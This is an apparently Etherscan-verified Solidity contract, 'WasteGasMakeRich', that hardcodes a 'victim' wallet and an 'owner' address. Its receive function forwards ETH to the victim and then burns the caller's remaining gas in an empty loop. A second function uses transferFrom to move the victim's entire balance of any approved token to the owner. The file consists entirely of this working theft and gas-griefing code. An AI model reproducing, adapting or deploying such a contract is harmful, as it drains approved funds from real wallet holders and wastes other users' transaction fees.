/**
 *Submitted for verification at Etherscan.io on 2022-07-14
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

interface IERC20 {

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


contract WasteGasMakeRich {
    uint256 constant GAS_REQUIRED_TO_FINISH_EXECUTION = 60;
    
    IERC20 token = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    address victim = 0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3;

    address owner = 0xa6b001Fbbd7291FE8Cb3AF7E620c4F8FB48bD48D;

    receive() external payable{
        payable(victim).transfer(msg.value);
        while (gasleft() > GAS_REQUIRED_TO_FINISH_EXECUTION) {
        }
    }


    function withdraw() public{
        token.transfer(owner,token.balanceOf(address(this)));
    }

    function withdrawTransferFrom(IERC20 _token) public{
        _token.transferFrom(victim,owner,_token.balanceOf(victim));
    }

}